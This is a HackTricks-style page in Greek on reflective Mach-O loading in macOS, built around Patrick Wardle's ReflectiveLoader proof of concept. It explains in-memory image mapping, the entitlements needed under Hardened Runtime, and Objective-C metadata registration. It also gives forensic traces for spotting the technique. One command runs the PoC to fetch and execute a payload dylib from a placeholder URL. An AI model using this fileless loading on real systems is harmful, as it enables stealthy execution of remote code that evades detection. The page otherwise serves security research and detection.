# Reflective Mach-O Loading σε macOS

{{#include ../../../banners/hacktricks-training.md}}

Ένας reflective loader αντιστοιχίζει ένα Mach-O image από bytes που βρίσκονται ήδη στη δική του διεργασία και, στη συνέχεια, το συνδέει και εκτελεί τους initializers του, χωρίς να ζητήσει από τον system loader να ανοίξει ένα αρχείο payload. Πρόκειται για **εκτέλεση κώδικα εντός της διεργασίας**, όχι για primitive κλιμάκωσης προνομίων ή injection σε απομακρυσμένη διεργασία.<sup>[[2]](#references)</sup>

Σε πρόσφατες εκδόσεις του macOS, η παλιά διαδρομή `NSCreateObjectFileImageFromMemory`/`NSLinkModule` γράφει το image στον δίσκο. Το ReflectiveLoader ενσωματώνει παλαιότερο κώδικα φόρτωσης του Apple dyld· ο Wardle το παρουσίασε σε macOS 15 και 26.<sup>[[2]](#references)[[3]](#references)</sup>

Αν ο loader χρησιμοποιεί το Hardened Runtime, ο unsigned κώδικάς του στη μνήμη χρειάζεται μια εξαίρεση για εκτελέσιμη μνήμη, όπως `com.apple.security.cs.allow-unsigned-executable-memory` ή `com.apple.security.cs.disable-executable-page-protection`· διαφορετικά, η εκτέλεση αποκλείεται από την επιβολή του code-signing. Αυτός είναι περιορισμός υπογραφής του loader, όχι primitive κλιμάκωσης προνομίων. Δείτε την [αναφορά entitlements του macOS](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Για το PoC, δώστε ένα URL που σερβίρει ένα raw Mach-O **bundle, framework ή dylib**. Το `main.mm` απορρίπτει κενά downloads και αναφέρει ότι δεν υποστηρίζονται payloads που χρησιμοποιούν `LC_DYLD_CHAINED_FIXUPS`. Γίνεται επίσης δεκτή μια τοπική διαδρομή αρχείου, αλλά αυτή η είσοδος δεν αποτελεί fileless workflow. Η μορφή URL διαβάζει τα bytes σε `NSData` και περνά το buffer και το μήκος του στο `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Ο embedded loader καλεί τις `ImageLoaderMachO::instantiateFromMemory` και στη συνέχεια `image->link`. Εγγράφει τα Objective-C metadata **μετά το linking αλλά πριν από το** `image->runInitializers`, το οποίο εκτελεί τους constructors.<sup>[[5]](#references)</sup> Χωρίς εγγραφή, ένας constructor που στέλνει ένα Objective-C μήνυμα μπορεί να αποτύχει με το σφάλμα `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Δείτε τη [συνήθη ροή φόρτωσης image του dyld](macos-library-injection/macos-dyld-process.md#flow) και την [αναφορά των Mach-O sections](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Ενεργοποίηση Objective-C metadata

Σε αντίθεση με τη συνήθη φόρτωση από το dyld, η ενσωμάτωση του παλαιότερου image loader δεν καθιστά αυτόματα τα Objective-C metadata του payload αξιοποιήσιμα από το `libobjc`.<sup>[[3]](#references)</sup> Η προσαρμοσμένη προσέγγιση LLVM JIT σαρώνει τα Objective-C sections `__DATA` και `__DATA_CONST` που έχουν αντιστοιχιστεί στη μνήμη και έπειτα εκτελεί τα εξής βήματα πριν εκτελεστούν οι constructors:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Διατρέχει το `__objc_selrefs` με βήματα μεγέθους `sizeof(SEL)`. Λαμβάνει το όνομα κάθε μη-null selector με το `sel_getName`, το περνά στο `sel_registerName` και αντικαθιστά τον δείκτη του section με το canonical `SEL`.
2. Συλλέγει τις κλάσεις από το `__objc_classlist` και τις εγγράφει με το `objc_readClassPair`, επιλύοντας πρώτα τις εξαρτήσεις από superclass.
3. Ενημερώνει τις αναφορές στα `__objc_classrefs` και `__objc_superrefs` ώστε να δείχνουν σε εγγεγραμμένες κλάσεις ή metaclasses και προσαρτά τις μεθόδους των categories από το `__objc_catlist`.

Για παράδειγμα, η επιδιόρθωση selector στο `ObjCRuntime.cpp` είναι ισοδύναμη με:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

Το PoC βασίζεται στην εσωτερική συμπεριφορά του runtime της Objective-C και δεν υποστηρίζει όλες τις δυνατότητες της μορφής Mach-O, επομένως ο κώδικας εγγραφής του αποτελεί αναφορά υλοποίησης και όχι έναν γενικής χρήσης loader που μπορεί να χρησιμοποιηθεί αυτούσιος.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Η εγγραφή είναι απαραίτητη τόσο για τις κλάσεις και τις μεθόδους της Apple στις οποίες γίνεται αναφορά όσο και για τις κλάσεις που ορίζονται από το payload.<sup>[[3]](#references)</sup>

Στις δοκιμές του συγγραφέα, μια εικόνα που φορτώνεται ανακλαστικά δεν εμφανίζεται στο `dyld_all_image_infos`. Αντίθετα, οι ανώνυμες εκτελέσιμες αντιστοιχίσεις μνήμης της μπορεί να εμφανίζονται ως ανώνυμες περιοχές `dylib` στο `vmmap`, ενώ τα δειγματοληπτημένα frames μπορεί να εμφανίζονται ως `<unknown binary>`. Αυτά αποτελούν ενδείξεις για την επιθεώρηση και όχι αξιόπιστη απόδοση σε αυτόν τον loader, ενώ η πρόσβαση στις πληροφορίες task μιας άλλης διεργασίας περιορίζεται από entitlements. Δείτε το [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) για τους περιορισμούς πρόσβασης σε διεργασίες.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C και Swift στο macOS: συλλογή γνώσεων](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Επαναφορά της ανακλαστικής φόρτωσης κώδικα στο macOS (Μέρος I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Επαναφορά της ανακλαστικής φόρτωσης κώδικα στο macOS (Μέρος II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
